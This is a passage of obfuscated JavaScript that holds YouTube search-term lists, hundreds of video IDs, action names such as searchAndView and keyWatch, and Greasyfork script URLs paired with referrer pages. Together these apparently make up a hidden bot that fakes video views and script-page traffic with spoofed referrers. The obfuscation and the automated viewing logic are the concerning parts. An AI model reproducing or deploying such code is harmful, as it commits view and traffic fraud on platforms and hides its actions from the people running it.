'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + V(0x5) + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * 0x179c + -0x18a5 + -0xb * -0x19)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x6b1 + 0x1 * 0x25fa + -0x2ca1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + W(0x7) + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * -0x3d7 + -0x2 * -0xc09 + -0x1be6);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    X(0x1, '2AgT') + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    X(0xc, '!Bl&') + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    V(0x13) + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + V(0x2),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + W(0x10) + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + W(0x9) + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
